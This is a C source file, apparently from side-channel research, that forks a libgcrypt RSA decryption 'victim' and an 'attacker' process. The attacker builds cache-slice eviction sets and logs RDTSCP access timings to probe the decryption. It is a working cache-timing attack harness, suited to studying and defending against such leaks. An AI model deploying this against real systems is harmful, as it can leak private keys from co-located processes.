#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <gcrypt.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "./lib/memory-utils.c"
#include "./lib/cache-utils.c"
#include <semaphore.h>
#include <pthread.h>

#define NEED_GCRYPT_VERSION "1.5.0"
#define SNAME "/home/hwnam/mysem"
#define NUMBER_CORES 8
#define READ_TIMES 16384

sem_t *mutex;
sem_t *mutex1;
int custom_lock;

void CorePin(int coreID)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(coreID,&set);
	if(sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
		printf("\nUnable to Set Affinity\n");
		exit(EXIT_FAILURE);
	}
}

int main_victim(){

    gcry_error_t err = 0;

    /* We don't want to see any warnings, e.g. because we have not yet
     parsed program options which might be used to suppress such
     warnings. */
    //gcry_control (GCRYCTL_SUSPEND_SECMEM_WARN);

    /* Allocate a pool of 16k secure memory. */
    //gcry_control (GCRYCTL_INIT_SECMEM, 16384, 0);

    /* It is now okay to let Libgcrypt complain when there was/is
        a problem with the secure memory. */
    //gcry_control (GCRYCTL_RESUME_SECMEM_WARN);

    /* Tell Libgcrypt that initialization has completed. */
    gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);

    if (!gcry_control (GCRYCTL_INITIALIZATION_FINISHED_P))
    {
      fputs ("libgcrypt has not been initialized\n", stderr);
      abort ();
    }


    char buf[2048], buf2[2048];
    FILE *pubf = fopen("pubkey", "r");
    fread(buf, 2048, 1, pubf);
    fclose(pubf);
    //printf("%s\n",buf);

    gcry_sexp_t pubkey, pvtkey;

    gcry_sexp_build(&pubkey, NULL, buf);
    //gcry_sexp_dump(pubkey);

    FILE *pvtf = fopen("pvtkey", "r");
    fread(buf2, 2048, 1, pvtf);
    fclose(pvtf);

    gcry_sexp_build(&pvtkey, NULL, buf2);

    /*
    gcry_sexp_sprint(pubkey, GCRYSEXP_FMT_ADVANCED, buf2, 2047);
    printf("%s\n",buf2);

    gcry_sexp_sprint(pvtkey, GCRYSEXP_FMT_ADVANCED, buf2, 2047);
    printf("%s\n",buf2);
    */

    const char* msg = "Hello World";
    
    gcry_sexp_t msgexp;
    gcry_sexp_build(&msgexp, NULL, "(data (flags pkcs1) (value %s) )", msg);

    gcry_sexp_t cipher;
    err = gcry_pk_encrypt(&cipher, msgexp, pubkey);
    if (err){
        printf("encryption failed: %d\n", err);
    }
    
    gcry_sexp_t cmsg = gcry_sexp_find_token(cipher, "a", 1);
    
    gcry_sexp_t ncipher;
    gcry_sexp_build(&ncipher, NULL, "(enc-val (flags pkcs1) (rsa %S ) )", cmsg);
    //gcry_sexp_dump(ncipher);

    //printf("start decrypt\n");
	sem_wait(mutex);
	sem_post(mutex1);
    gcry_sexp_t outmsg;
    gcry_pk_decrypt(&outmsg, ncipher, pvtkey);

    gcry_sexp_dump(outmsg);
    return 0;
}

int main_attacker(int coreID, int desiredSlice) {
	/*
	 * Check arguments: should contain coreID and slice number
	 */

	/*
    pid_t cpid;
    cpid = fork();

    if (cpid == 0){
        //child process = victim
        //CorePin(1);
        int retval = main_victim();
        return retval;
    }
	printf("hello from parent\n");
	*/
	/* 
	 * Ping program to core-0 for finding chunks
	 * Later the program will be pinned to the desired coreID
	 */
	CorePin(0);
	FILE *logfp = fopen("attack.log", "w");
	fprintf(logfp, "direction,time,accesstime\n");
	/* Get a 1GB-hugepage */
	void *buffer = create_buffer();

	/* Calculate the physical address of the buffer */
	uint64_t bufPhyAddr = get_physical_address(buffer);

	/* Memory Chunks -> Fit in LLC */
	unsigned long long nTotalChunks=(unsigned long long)LLC_WAYS+L2_WAYS;
	/* Memory Chunks -> Fit in L2 */
	unsigned long long nL2Chunks=(unsigned long long)LLC_WAYS;


	/* Memory Chunks -> Fit in L1 */
	unsigned long long nL1Chunks=L1_WAYS;

	/* Stride: Can be used to avoid prefetching */
	unsigned long long stride=1;

	/* Variables for calculating cache indexes */
	uint64_t index3, index2, index1;

	/* Address to different chunks that are mapped to the desired slice - each 64 Byte (Virtual Address) */
	void ** totalChunks=malloc(nTotalChunks*sizeof(*totalChunks));

	/* Physical Address of chunks */
	unsigned long long *totalChunksPhysical=malloc(nTotalChunks*sizeof(*totalChunksPhysical));

	unsigned long long  i=0;
	int j=0,k=0;

	/* Find first chunk */
	unsigned long long offset = sliceFinder_uncore(buffer,desiredSlice);

	totalChunks[0]=buffer+offset;
	totalChunksPhysical[0]= bufPhyAddr+offset;

	/* Find the Indexes (Set number in cache hierarychy) */
	index3=indexCalculator(totalChunksPhysical[0],3);
	index2=indexCalculator(totalChunksPhysical[0],2);
	index1=indexCalculator(totalChunksPhysical[0],1);

	/* Find next chunks which are residing in the desired slice and the same sets in L3/L2/L1*/
	for(i=1;i<nTotalChunks; i++) {
		offset=L3_INDEX_STRIDE;
		while(desiredSlice!=calculateSlice_uncore(totalChunks[i-1]+offset) || index1!=indexCalculator(totalChunksPhysical[i-1]+offset,1) || index2!=indexCalculator(totalChunksPhysical[i-1]+offset,2) || index3!=indexCalculator(totalChunksPhysical[i-1]+offset,3)) {
			offset+=L3_INDEX_STRIDE;
		}
		totalChunks[i]=totalChunks[i-1]+offset;
		totalChunksPhysical[i]=totalChunksPhysical[i-1]+offset;
	}

	/* validate chunks: whether they are on the desired slice or not */
	for(i=0;i<nTotalChunks;i++) {
		if(desiredSlice!=calculateSlice_uncore(totalChunks[i])) {
			printf("Error!");
			exit(EXIT_FAILURE);
		}
	}
        
	/* Ping program to coreID */
    CorePin(coreID);
	//sched_yield();

	unsigned char *slice;
	int maxnum = READ_TIMES*(nL2Chunks/stride + 1)*2;
	unsigned long *times = (unsigned long*)malloc(sizeof(unsigned long)*maxnum);
	int *accesstimes = (int*)malloc(sizeof(int)*READ_TIMES*maxnum);
	int cnt = 0;
	sem_post(mutex);
	printf("posted\n");
	sem_wait(mutex1);
	// Fill Arrays 
	for(i=0; i<nTotalChunks;i++) {
		slice=totalChunks[i];
		for(j=0;j<64;j++) {
			slice[j]=10+20;
		}
	}
	for(k=0;k<READ_TIMES;k++) {
		
		/* Flush Array 
		for(i=0; i<nTotalChunks;i++) {
			slice=totalChunks[i];
			for(j=0;j<64;j+=8) {
				_mm_prefetch(&slice[j],_MM_HINT_T2);
			}
		}*/

		register uint64_t time1, time2;
		unsigned int val=0;
		
		
		// Gives LLC Access Time
		for(i=0; i<nL2Chunks;i=i+stride) {
			slice=totalChunks[i];
			asm volatile ("RDTSCP\n\t"
				"shl $32,%%rdx; "
				"or %%rdx,%%rax"
				: "=a"(time1)
				:
				: "rcx", "rdx");

			// Measured operation 
			val=*slice;
			_mm_clflush(slice);
			asm volatile ("RDTSCP\n\t"
				"shl $32,%%rdx; "
				"or %%rdx,%%rax"
				: "=a"(time2)
				:
				: "rcx", "rdx");
			
			_mm_prefetch(slice, _MM_HINT_T2);
			_mm_prefetch(&slice[1], _MM_HINT_T2);
			_mm_prefetch(&slice[2], _MM_HINT_T2);
			_mm_prefetch(&slice[4], _MM_HINT_T2);
			_mm_prefetch(&slice[8], _MM_HINT_T2);
			_mm_prefetch(&slice[16], _MM_HINT_T2);
			
			times[cnt] = time1;
			accesstimes[cnt++] = time2-time1;

		}
		while(custom_lock>1){
			usleep(300);
		}
	}
	


	for (k = 0; k<cnt; k++){
		fprintf(logfp, "core%dToSlice%d,\t %lu, \t %lu\n", coreID, desiredSlice, times[k], accesstimes[k]);
	}

	/* Free the buffers */
	free_buffer(buffer);
	free(totalChunks);
	free(totalChunksPhysical);
	fclose(logfp);
	free(times);
	free(accesstimes);
	return 0;
}

int main(int argc, char **argv){
    
	if (!gcry_check_version(NEED_GCRYPT_VERSION)){
        fprintf (stderr, "libgcrypt is too old (need %s, have %s)\n",
         NEED_GCRYPT_VERSION, gcry_check_version (NULL));
        exit (2);
    }
	
	/*
    if(argc!=3){
		printf("Wrong Input! Enter desired slice and coreID!\n");
		printf("Enter: %s <coreID> <sliceNumber>\n", argv[0]);
		exit(1);
	}


	if(coreID > NUMBER_CORES*2-1 || coreID < 0){
		printf("Wrong Core! CoreID should be less than %d and more than 0!\n", NUMBER_CORES);
		exit(1);   
	}


	if(desiredSlice > NUMBER_SLICES-1 || desiredSlice < 0){
		printf("Wrong slice! Slice should be less than %d and more than 0!\n", NUMBER_SLICES);
		exit(1);   
	}
	*/

	int errn;
	mutex = (sem_t *)mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, \
		MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	mutex1 = (sem_t *)mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, \
		MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	errn = sem_init(mutex, 1, 0);
	errn = sem_init(mutex1, 1, 0);
	printf("custom lock is %d\n",custom_lock);
	
	//pthread_mutexattr_t mattr;
	//pthread_mutexattr_init(&mattr);
	//pthread_mutexattr_setpshared(&mattr, PTHREAD_PROCESS_SHARED);
	//custom_lock = (pthread_mutex_t *)mmap(NULL, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, \
	//	MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, 0, 0);
	//errn = pthread_mutex_init(custom_lock, &mattr);
	//pthread_mutex_unlock(custom_lock);
	//printf("%d\n",errn);


	//sem_getvalue(&sem_i, &errn);
    pid_t cpid;
    cpid = fork();

    if (cpid != 0){
        //parent process = attacker
        return main_attacker(2,6);
		//return 0;
    } else {
        //child process = victim
        CorePin(3);
		//sem_wait(&sem_i);
        int retval = main_victim();
        //*exited = 1;
        return retval;
    }

}